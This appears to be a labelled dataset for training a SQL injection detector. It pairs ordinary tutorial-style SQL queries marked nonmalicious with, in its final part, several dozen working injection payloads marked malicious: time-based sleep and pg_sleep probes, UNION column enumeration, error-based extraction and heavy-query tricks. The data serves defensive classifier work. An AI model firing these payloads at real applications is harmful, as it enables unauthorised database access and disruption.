__label__nonmalicious  SELECT column_name  FROM table1 UNION SELECT column_name FROM table2;
__label__nonmalicious  SELECT * FROM Employee WHERE City LIKE 'lon%';
__label__nonmalicious  SELECT * FROM Product WHERE City LIKE 'ge%';
__label__nonmalicious  SELECT * FROM Customers WHERE City LIKE '_ondon';
__label__nonmalicious  SELECT * FROM Ptoducts WHERE City LIKE '[bsp]%'; 
__label__nonmalicious  SELECT * FROM Customers WHERE City LIKE '[!ffg]%';
__label__nonmalicious  SELECT * FROM Customers WHERE City IN ('Germany', 'France', 'UK');
__label__nonmalicious  SELECT * FROM Students WHERE Country NOT IN ('Germany', 'Italy', 'Saudi Arabia');
__label__nonmalicious  CREATE TABLE Employee_Info (EmployeeID int, EmployeeName varchar(255), Emergency ContactName varchar(255), PhoneNumber int, Address varchar(255), City varchar(255), Country varchar(255))
__label__nonmalicious  SELECT Student_ID FROM STUDENT;
__label__nonmalicious  SELECT * FROM STUDENT;
__label__nonmalicious  SELECT EMP_ID, NAME FROM EMPLOYEE_TBL WHERE EMP_ID = '0000';
__label__nonmalicious  SELECT EMP_ID, LAST_NAME FROM EMPLOYEE WHERE CITY = 'Seattle' ORDER BY EMP_ID;
__label__nonmalicious  SELECT Name, Age FROM Patients WHERE Age > 40 GROUP BY Name, Age ORDER BY Name;
__label__nonmalicious  SELECT COUNT(price), price FROM orders WHERE price < 70 GROUP BY price ORDER BY price;
__label__nonmalicious  SELECT COUNT(CustomerID), Country FROM Customers GROUP BY Country
__label__nonmalicious  SELECT SUM(Salary)FROM Employee WHERE Emp_Age < 30;
__label__nonmalicious  SELECT AVG(Price)FROM Products;
__label__nonmalicious  SELECT * FROM My_Schema.views;
__label__nonmalicious  CREATE VIEW Failing_Students AS SELECT S_NAME, Student_ID FROM STUDENT WHERE GPA > 40;
__label__nonmalicious  CREATE OR REPLACE VIEW [ Product List] AS SELECT ProductID, ProductName, Category FROM Products WHERE Discontinued = No;
__label__nonmalicious  SELECT * FROM Sys.objects WHERE Type='u';
__label__nonmalicious  SELECT * from Sys.Objects WHERE Type='PK';
__label__nonmalicious  SELECT * FROM Sys.Objects WHERE Type='uq';
__label__nonmalicious  SELECT * FROM Sys.Objects WHERE Type='f';
__label__nonmalicious  SELECT * FROM Sys.Objects WHERE Type='tr';
__label__nonmalicious  SELECT * FROM Sys.Objects WHERE Type='it';
__label__nonmalicious  UPDATE Customers SET Zip=Phone, Phone=Zip;
__label__nonmalicious  SELECT ID FROM Orders WHERE Date BETWEEN ‘01/12/2018’ AND ‘01/13/2018’;
__label__nonmalicious  SELECT ID FROM Customers INNER JOIN Orders ON Customers.ID = Orders.ID;
__label__nonmalicious  SELECT phone FROM Customers UNION SELECT item FROM Orders;
__label__nonmalicious  SELECT Item FROM Orders WHERE id = ALL (SELECT ID FROM Orders WHERE quantity > 50);
__label__nonmalicious  SELECT item FROM Orders WHERE date ALL = (SELECT Order_ID FROM Orders WHERE quantity > 50);
__label__nonmalicious  ALTER TABLE Customers ADD Birthday varchar(80);
__label__nonmalicious  ID int NOT NULL AUTO_INCREMENT;
__label__nonmalicious  SELECT Name, Birthday, Phone, Address, Zip FROM Customers;
__label__nonmalicious  SELECT Name FROM Customers WHERE EXISTS (SELECT Item FROM Orders WHERE Customers.ID = Orders.ID AND Price < 50);
__label__nonmalicious  INSERT INTO Yearly_Orders SELECT * FROM Orders WHERE Date<=1/1/2018;
__label__nonmalicious  SELECT Item, Price * (QtyInStock + IFNULL(QtyOnOrder, 0)) FROM Orders;
__label__nonmalicious  SELECT COUNT(ID), Region FROM Customers GROUP BY Region HAVING COUNT(ID) > 0;
__label__nonmalicious  Select * from Employee A where rownum <=8 union select * from (Select * from Employee A order by rowid desc) where rownum <=8;
__label__nonmalicious  SELECT eno, empname, dtno, salary, MAX(salary) OVER () AS max_result FROM   employee;
__label__nonmalicious  SELECT price FROM   sales_order ORDER BY price;
__label__nonmalicious  SELECT prdid, SUM(amount), PERCENT_RANK() OVER (ORDER BY SUM(amount) DESC) AS percent_rank FROM sales GROUP BY prdid ORDER BY prdid;
__label__nonmalicious  SELECT eno, empname, dtno, salary, MAX(salary) OVER () AS max_result FROM   employee
__label__nonmalicious  SELECT price FROM   sales_order ORDER BY price;
__label__nonmalicious  SELECT eno, dno, salary, AVG(salary) OVER () AS avg_sal FROM employee;
__label__nonmalicious  SELECT eno, dno,salary, DENSE_RANK() OVER (PARTITION BY dno ORDER BY salary) AS ranking FROM employee;
__label__nonmalicious  SELECT DISTINCT " column_name " FROM " table_name "
__label__nonmalicious  SELECT DISTINCT Store_Name FROM Store_Information;
__label__nonmalicious  SELECT Store_Name FROM Store_Information WHERE Sales > 1000;
__label__nonmalicious  SELECT * FROM Store_Information WHERE Sales > 1000 OR Txn_Date = 'Jan-08-1999';
__label__nonmalicious  SELECT * FROM Users WHERE Gender = 'M';
__label__nonmalicious  SELECT Gender FROM Users WHERE Last_Name = 'Wilkes';
__label__nonmalicious  SELECT * FROM Store_Information WHERE Txn_Date BETWEEN 'Jan-06-1999' AND 'Jan-10-1999';
__label__nonmalicious  SELECT * FROM Store_Information WHERE Sales NOT BETWEEN 280 and 1000;
__label__nonmalicious  SELECT * FROM Store_Information WHERE Store_Name IN ('Los Angeles', 'San Diego');
__label__nonmalicious  SELECT Store_Name, Sales, Txn_Date FROM Store_Information ORDER BY 2 DESC;
__label__nonmalicious  SELECT Store_Name FROM Store_Information ORDER BY Sales DESC;
__label__nonmalicious  SELECT Product_ID, Price*Units Revenue FROM Product_Sales ORDER BY Price*Units DESC;
__label__nonmalicious  SELECT Store_Name, SUM(Sales) FROM Store_Information GROUP BY Store_Name HAVING SUM(Sales) > 1500;
__label__nonmalicious  SELECT Store_Name, SUM(Sales) FROM Store_Information GROUP BY Store_Name;
__label__nonmalicious  SELECT Store_Name, Product_ID, SUM(Sales) FROM Store_Information GROUP BY Store_Name, Product_ID;
__label__nonmalicious  SELECT Store_Name, Product_ID, SUM(Sales), AVG(Sales) FROM Store_Information GROUP BY Store_Name, Product_ID;
__label__nonmalicious  SELECT Txn_Date, SUM(Sales)FROM Store_Information GROUP BY Txn_Date ORDER BY Txn_Date;
__label__nonmalicious  SELECT A1.Store_Name Store, SUM(A1.Sales) "Total Sales" FROM Store_Information A1 GROUP BY A1.Store_Name;
__label__nonmalicious  Select * from books where pageCount &gt; 200;
__label__nonmalicious  Select * from books where pageCount between 100 and 200;
__label__nonmalicious  Select top 1 * from books order by pageCount desc;
__label__nonmalicious  Select * from books where pageCount= (Select max(pageCount) from books);
__label__nonmalicious  Insert into authors(name,surname) Select top 5 name,surname from students order by newid();
__label__nonmalicious  Insert into authors(name,surname) values('Ernest','Dowson'),('Mother','Goose') Or Insert into authors values ('Ernest','Dowson'),('Mother','Goose');
__label__nonmalicious  Select DateName(mm,birthdate) as MName,count(*) as Count  from students group by DATEName(mm,birthdate);
__label__nonmalicious  Select DateName(mm,birthdate) as MName,count(*) as Count  from students group by DATEName(mm,birthdate) order by Count;
__label__nonmalicious  Select DateName(mm,birthdate) as MName,count(*) as Count  from students where gender = 'M' group by DATEName(mm,birthdate) order by Count;
__label__nonmalicious  Select DATENAME(mm,takenDate) as Months,count(*) as Count from borrows group by DATENAME(mm,takenDate);
__label__nonmalicious  Select DATENAME(mm,takenDate) as Months,count(*) as BookCount from borrows group by DATENAME(mm,takenDate) order by BookCount;
__label__nonmalicious  Select DATENAME(mm,takenDate) as Months,count(*) as BookCount from borrows group by DATENAME(mm,takenDate) order by 2;
__label__nonmalicious  Select DATENAME(mm,takenDate) as Months,count(*) as BookCount from borrows where year(takenDate) = 2015 group by DATENAME(mm,takenDate) order by BookCount;
__label__nonmalicious  Select DATENAME(mm,takenDate) as Months,count(*) as BookCount from borrows where year(takenDate) = 2015 group by DATENAME(mm,takenDate) having count(*)>100 order by BookCount;
__label__nonmalicious  Select FIRST_NAME AS WORKER_NAME from Worker;
__label__nonmalicious  Select upper(FIRST_NAME) from Worker;
__label__nonmalicious  Select substring(FIRST_NAME,1,3) from Worker;
__label__nonmalicious  Select CONCAT(FIRST_NAME, ' ', LAST_NAME) AS 'COMPLETE_NAME' from Worker;
__label__nonmalicious  Select * from Worker where FIRST_NAME in ('NIHARIKA','PRIYANSHA');
__label__nonmalicious  Select * from Worker where FIRST_NAME not in ('NIHARIKA','PRYANSHA');
__label__nonmalicious  Select * from Worker where DEPARTMENT like 'Admin%';
__label__nonmalicious  Select * from Worker where year(JOINING_DATE) = 2014 and month(JOINING_DATE) = 2;
__label__nonmalicious  SELECT COUNT(*) FROM worker WHERE DEPARTMENT = 'Admin';
__label__nonmalicious  SELECT CONCAT(FIRST_NAME, ' ', LAST_NAME) As Worker_Name, Salary FROM worker
__label__nonmalicious  WHERE WORKER_ID IN (SELECT WORKER_ID FROM worker WHERE Salary BETWEEN 5000 AND 10000);
__label__nonmalicious  SELECT DEPARTMENT, count(WORKER_ID) No_Of_Workers FROM worker GROUP BY DEPARTMENT ORDER BY No_Of_Workers DESC;
__label__nonmalicious  SELECT * FROM Worker WHERE MOD (WORKER_ID, 2) <> 0;
__label__nonmalicious  SELECT * FROM Worker WHERE MOD (WORKER_ID, 2) = 0;
__label__nonmalicious  SELECT * INTO WorkerClone FROM Worker;
__label__nonmalicious  SELECT * INTO WorkerClone FROM Worker WHERE 1 = 0;
__label__nonmalicious  SELECT * FROM Worker MINUS SELECT * FROM Title;
__label__nonmalicious  SELECT DISTINCT W.FIRST_NAME, T.WORKER_TITLE FROM Worker W INNER JOIN Title T ON W.WORKER_ID = T.WORKER_REF_ID AND T.WORKER_TITLE in ('Manager');
__label__nonmalicious  SELECT * FROM Developers WHERE Country='India' AND City='Delhi';
__label__nonmalicious  SELECT * FROM Developers WHERE City='London' OR City='Paris';
__label__nonmalicious  ALTER TABLE Developers ADD BirthDate date;
__label__nonmalicious  ALTER TABLE Developers DROP COLUMN BirthDate;
__label__nonmalicious  SELECT ID as developerID, Name AS developers FROM develop;
__label__nonmalicious  SELECT o.ID, c.Name FROM Customers AS c, Customer_orders AS o WHERE c.id = 2 AND c.ID = o.customer_id;
__label__nonmalicious  SELECT * FROM Orders WHERE Price BETWEEN 10 AND 15;
__label__nonmalicious  CREATE DATABASE developers;
__label__nonmalicious  CREATE TABLE Suppliers (SupplierID int,FirstName varchar(255),LastName varchar(255),City varchar(255),Country varchar(255));
__label__nonmalicious  CREATE INDEX idx_lastname ON Persons (LastName);
__label__nonmalicious  DELETE FROM Developers WHERE Name='Antonio Indigo';
__label__nonmalicious  DELETE * FROM Developers;
__label__nonmalicious  GRANT SELECT, UPDATE ON YOUR_TABLE TO FIRST_USER, SECOND_USER;
__label__nonmalicious  REVOKE SELECT, UPDATE ON YOUR_TABLE FROM FIRST_USER, SECOND_USER;
__label__nonmalicious  DELETE FROM CUSTOMERS WHERE AGE = 18;  
__label__nonmalicious  DROP DATABASE db_name
__label__nonmalicious  ALTER TABLE tbl_name DROP INDEX indx_name
__label__nonmalicious  SELECT id, name FROM Developers;
__label__nonmalicious  WHERE EXISTS (SELECT id FROM developers_orders WHERE developers_orders.customer_id=customers.id AND developers.city = "Rome");
__label__nonmalicious  SELECT COUNT(ID), City FROM Developers GROUP BY City;
__label__nonmalicious  SELECT * FROM Developers WHERE Country IN ('USA', 'France', 'India');
__label__nonmalicious  SELECT COUNT(ID), Country FROM Pets GROUP BY Country HAVING COUNT(ID) > 2;
__label__nonmalicious  SELECT * FROM Developers WHERE Country IN ('USA', 'France', 'India');
__label__nonmalicious  INSERT INTO Developers (Name, City, Country) VALUES ('Luke Christon', 'London', 'UK');
__label__nonmalicious  SELECT Orders.ID, Developers.Name FROM Orders INNER JOIN Developers ON Orders.ID = Developers.ID; SELECT Orders.ID, Developers.Name FROM Orders INNER JOIN Developers ON Orders.ID = Developers.ID;
__label__nonmalicious  SELECT Customer_orders.ID, Employees.Last_name, Employees.First_name FROM Customer_orders RIGHT JOIN Employees ON Customer_orders.employee_id = Employees.ID ORDER BY Customer_orders.ID;
__label__nonmalicious  SELECT * FROM users WHERE email LIKE '%gmail%';
__label__nonmalicious  SELECT * FROM users ORDER BY email DESC;
__label__nonmalicious  SELECT username,email FROM users;
__label__nonmalicious  SELECT DISTINCT City FROM Developers;
__label__nonmalicious  SELECT * INTO CustomerBackup2018 FROM developers;
__label__nonmalicious  SELECT * FROM developers LIMIT 3;
__label__nonmalicious  SELECT * FROM developers LIMIT 3;
__label__nonmalicious  SELECT * FROM Developers WHERE Country='France';
__label__nonmalicious  SELECT * FROM Customers WHERE Last_Name='Smith';
__label__nonmalicious  SELECT Cust_No, First_Name FROM Customers WHERE Last_Name='Smith';
__label__nonmalicious  SELECT First_Name, Nickname FROM Friends WHERE Nickname LIKE '%brain%';
__label__nonmalicious  SELECT * FROM Friends WHERE First_Name LIKE '_en';
__label__nonmalicious  SELECT Student_ID FROM STUDENT;
__label__nonmalicious  SELECT * FROM My_Schema.Tables;
__label__nonmalicious  SELECT * FROM STUDENT;
__label__nonmalicious  SELECT EMP_ID, NAME FROM EMPLOYEE_TBL WHERE EMP_ID = '0000'
__label__nonmalicious  SELECT EMP_ID, LAST_NAME FROM EMPLOYEE WHERE CITY = 'Seattle' ORDER BY EMP_ID;
__label__nonmalicious  SELECT EMP_ID, LAST_NAME FROM EMPLOYEE_TBL WHERE CITY = 'INDIANAPOLIS' ORDER BY EMP_ID asc;
__label__nonmalicious  SELECT Name, Age FROM Patients WHERE Age > 40 GROUP BY Age ORDER BY Name;
__label__nonmalicious  SELECT COUNT(developerID), Country FROM developer GROUP BY Country;
__label__nonmalicious  SELECT SUM(Salary)FROM Employee WHERE Emp_Age < 30;
__label__nonmalicious  SELECT AVG(Price)FROM orders;
__label__nonmalicious  SELECT AVG(Price)FROM Products;
__label__nonmalicious  SELECT * FROM Failing_Students;
__label__nonmalicious  DROP VIEW V1;
__label__nonmalicious  SELECT * FROM Sys.objects WHERE Type='u'
__label__nonmalicious  SELECT * from Sys.Objects WHERE Type='PK'
__label__nonmalicious  SELECT * FROM Sys.Objects WHERE Type='uq'
__label__nonmalicious  SELECT * FROM Sys.Objects WHERE Type='f'
__label__nonmalicious  UPDATE Customers SET Zip=Phone, Phone=Zip
__label__nonmalicious  SELECT DISTINCT ID FROM Cakes
__label__nonmalicious  SELECT * From cakes WHERE Name LIKE 'Herb%'
__label__nonmalicious  SELECT ID FROM Orders WHERE Date BETWEEN â€ک01/12/2018â€™ AND â€ک01/13/2018â€™
__label__nonmalicious  INSERT INTO STATION VALUES (13, 'Phoenix', 'AZ', 33, 112); 
__label__nonmalicious  INSERT INTO STATION VALUES (44, 'Denver', 'CO', 40, 105); 
__label__nonmalicious  INSERT INTO STATION VALUES (66, 'Caribou', 'ME', 47, 68);
__label__nonmalicious  CREATE TABLE STATION (ID INTEGER PRIMARY KEY, CITY CHAR(20), STATE CHAR(2), LAT_N REAL, LONG_W REAL);
__label__nonmalicious  SELECT * FROM STATION;
__label__nonmalicious  SELECT * FROM STATION WHERE LAT_N > 39.7;
__label__nonmalicious  CREATE TABLE STATS (ID INTEGER REFERENCES STATION(ID), MONTH INTEGER CHECK(MONTH BETWEEN 1 AND 12), TEMP_F REAL CHECK (TEMP_F BETWEEN -80 AND 150), RAIN_I REAL CHECK (RAIN_I BETWEEN 0 AND 100), PRIMARY KEY (ID, MONTH));
__label__nonmalicious  INSERT INTO STATS VALUES (13, 1, 57.4, 0.31); 
__label__nonmalicious  INSERT INTO STATS VALUES (13, 7, 91.7, 5.15); 
__label__nonmalicious  INSERT INTO STATS VALUES (44, 1, 27.3, 0.18); 
__label__nonmalicious  INSERT INTO STATS VALUES (44, 7, 74.8, 2.11); 
__label__nonmalicious  INSERT INTO STATS VALUES (66, 1, 6.7, 2.10); 
__label__nonmalicious  INSERT INTO STATS VALUES (66, 7, 65.8, 4.52);
__label__nonmalicious  SELECT * FROM STATS;
__label__nonmalicious  SELECT * FROM STATION, STATS WHERE STATION.ID = STATS.ID 
__label__nonmalicious  SELECT MONTH, ID, RAIN_I, TEMP_F FROM STATS ORDER BY MONTH, RAIN_I DESC;
__label__nonmalicious  SELECT LAT_N, CITY, TEMP_F FROM STATS, STATION WHERE MONTH = 7 AND STATS.ID =STATION.ID ORDER BY TEMP_F;
__label__nonmalicious  SELECT MAX(TEMP_F), MIN(TEMP_F), AVG(RAIN_I), ID FROM STATS GROUP BY ID;
__label__nonmalicious  SELECT * FROM STATION WHERE 50 < (SELECT AVG(TEMP_F) FROM STATS WHERE STATION.ID = STATS.ID);
__label__nonmalicious  UPDATE STATS SET RAIN_I = 4.50 WHERE ID = 44 AND MONTH = 7;
__label__nonmalicious  SELECT Item, Price *(QtyInStock + IFNULL(QtyOnOrder, 0))FROM Orders
__label__nonmalicious  SELECT COUNT(ID), Region FROM Customers GROUP BY Region HAVING COUNT(ID) > 0;
__label__nonmalicious  SELECT SUBSTRING_INDEX("medium.com/gumare64", ".", 2);
__label__nonmalicious  DELETE FROM STATS WHERE MONTH = 7 OR ID IN (SELECT ID FROM STATION WHERE LONG_W < 90);
__label__nonmalicious  DELETE FROM STATION WHERE LONG_W < 90;
__label__nonmalicious  INSERT INTO STATS VALUES (33,8,27.4,.19);
__label__nonmalicious  UPDATE STATS SET TEMP_F = -100 WHERE ID = 44 AND MONTH = 1;
__label__nonmalicious  INSERT INTO STATS VALUES (44,8,27.4,-.03);
__label__nonmalicious  INSERT INTO STATS VALUES (44,13,27.4,.19);
__label__nonmalicious  SELECT A1.Store_Name Store, SUM(A1.Sales) "Total Sales" FROM Store_Information A1 GROUP BY A1.Store_Name;
__label__nonmalicious  SELECT Txn_Date FROM Store_Information INTERSECT SELECT Txn_Date FROM Internet_Sales;
__label__nonmalicious  SELECT TOP 2 Store_Name, Sales, Txn_Date FROM Store_Information  ORDER BY Sales DESC;
__label__nonmalicious  SELECT TOP 25 PERCENT Store_Name, Sales, Txn_Date FROM Store_Information ORDER BY Sales DESC;
__label__nonmalicious  SELECT A1.Store_Name STORE, SUM(A2.Sales) SALES FROM Geography A1 INNER JOIN Store_Information A2 ON A1.Store_Name = A2.Store_Name GROUP BY A1.Store_Name;
__label__nonmalicious  SELECT TOP 2 Store_Name, Sales, Txn_Date FROM Store_Information ORDER BY Sales DESC
__label__nonmalicious  SELECT a1.* FROM Store_Sales a1 WHERE a1.Sales > (SELECT AVG(Sales) AVG_SALES FROM Store_Sales);
__label__nonmalicious  SELECT SUM(Sales) FROM Store_Information WHERE EXISTS (SELECT * FROM Geography WHERE Region_Name = 'West');
__label__nonmalicious  UPDATE Store_Information SET Sales = 500 WHERE Store_Name = 'Los Angeles' AND Txn_Date = 'Jan-08-1999';
__label__nonmalicious  UPDATE Store_Information SET Sales = 600, Txn_Date = 'Jan-15-1999' WHERE Store_Name = 'San Diego';
__label__nonmalicious  SELECT Store_Name, CASE Store_Name WHEN 'Los Angeles' THEN Sales * 2  WHEN 'San Diego' THEN Sales * 1.5 ELSE Sales END "New Sales", Txn_Date FROM Store_Information;
__label__nonmalicious  SELECT Txn_Date FROM Store_Information UNION SELECT Txn_Date FROM Internet_Sales;
__label__nonmalicious  SELECT A1.Store_Name STORE1, A2.Store_Name STORE2, A2.Sales SALES FROM Geography A1 JOIN Store_Information A2;
__label__nonmalicious  SELECT A1.store_name STORE1, A2.store_name STORE2, A2.Sales SALES FROM Geography A1, Store_Information A2;
__label__nonmalicious  SELECT A1.Store_Name Store, SUM(A1.Sales) AS "Total Sales" FROM Store_Information AS A1 GROUP BY A1.Store_Name;
__label__nonmalicious  SELECT A1.Store_Name, SUM(A2.Sales) SALES FROM Geography A1, Store_Information A2 WHERE A1.Store_Name = A2.Store_Name (+) GROUP BY A1.Store_Name;
__label__malicious  1%' and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and '%' = '
__label__malicious  -5903%"  )  )   )  or 3038 = 3038
__label__malicious  -2174'  )  )   as zhoz where 4185 = 4185 order by 1#
__label__malicious  -8661" union all select 5731,5731--
__label__malicious  1' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and 'rpiz' like 'rpiz
__label__malicious  select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  7749 = 7749
__label__malicious  -5211 union all select 1754--
__label__malicious  select  ( case when  ( 9299 = 2760 )  then 1 else 9299* ( select 9299 from master..sysdatabases )  end ) --
__label__malicious  -3433' )  where 8307 = 8307 union all select 8307,8307,8307,8307,8307,8307,8307,8307--
__label__malicious  1" )  where 1107 = 1107 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --
__label__malicious  1" )  as jask where 7629 = 7629 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --
__label__malicious   select * from users where id = 1 or "{ ) " or 1 = 1 -- 1
__label__malicious  1'  )  )   )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (   ( 'swfj' like 'swfj
__label__malicious  1' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and 'egye' = 'egye
__label__malicious  1'  )  )   )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( 'iuki' = 'iuki
__label__malicious  1%' )  rlike  ( select  ( case when  ( 1210 = 8664 )  then 1 else 0x28 end  )  )   and  ( '%' = '
__label__malicious  select  ( case when  ( 5914 = 2314 )  then 5914 else 1/ ( select 0 )  end ) --
__label__malicious  -9263' )  as qodg where 6798 = 6798 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --
__label__malicious  1' )  as upgb where 2031 = 2031
__label__malicious  select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  (  'vjdk' like 'vjdk
__label__malicious  -9711'+ ( select 'ckpj' where 8338 = 8338 union all select 8338--
__label__malicious  select count ( * )  from generate_series ( 1,5000000 )  and  ( "%" = "
__label__malicious  1'  )  )   union all select null,null,null,null,null,null,null,null#
__label__malicious  1'+ ( select 'hjku' where 1954 = 1954 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno  )  )  +'
__label__malicious  1 and make_set ( 8403 = 8403,8899 ) # zysq
__label__malicious  1 )  and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) 
__label__malicious  1"  )  )   union all select null--
__label__malicious  select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'vhvh' = 'vhvh
__label__malicious   select * from users where id = 1 % ( @ )  or 1 = 1 -- 1
__label__malicious  1%" )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and  ( "%" = "
__label__malicious  1' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  
__label__malicious  1' )  where 2974 = 2974 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --
__label__malicious  1%'  )  )   )  and sleep ( 5 )  and   (  (   ( '%' = '
__label__malicious  -3750'+ ( select alpu where 3911 = 3911 order by 1--
__label__malicious  1'|| ( select 'skds' from dual where 8594 = 8594 and make_set ( 6779 = 2027,2027  )  )  ||'
__label__malicious  -4785"  )  )   )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #
__label__malicious  -8034" or 8571 = 8571--
__label__malicious  -7971' union all select 4273#
__label__malicious  iif ( 1095 = 2853,1,1/0 ) 
__label__malicious  1'|| ( select 'ghby' from dual where 4854 = 4854
__label__malicious  1%' )  or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --
__label__malicious  -1628" union all select 9189,9189,9189,9189,9189,9189,9189,9189,9189--
__label__malicious  select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  (  "tbcc" = "tbcc
__label__malicious  -9007 )  as gill where 6462 = 6462 union all select 6462,6462,6462,6462,6462,6462,6462,6462,6462#
__label__malicious  1' )  as syer where 3141 = 3141 rlike  ( select  ( case when  ( 6233 = 7567 )  then 1 else 0x28 end  )  )  --
__label__malicious  1 )  as otsb where 8380 = 8380 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --
__label__malicious  1" )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( "wfwg" like "wfwg
__label__malicious  1" or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --
__label__malicious  -7859 )  as ipdg where 4413 = 4413 or 9323 = 9323#
__label__malicious  1 )  or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --
__label__malicious  1' )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( 'mptm' = 'mptm
__label__malicious  1 where 1842 = 1842 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #
__label__malicious  1' in boolean mode )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --
__label__malicious  1' where 8945 = 8945 and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --
__label__malicious  -6951" union all select 2518,2518,2518,2518,2518,2518,2518,2518--
__label__malicious  -7175' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and 'upzo' = 'upzo
__label__malicious  1" )  as pwvu where 8267 = 8267
__label__malicious  -9057" )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #
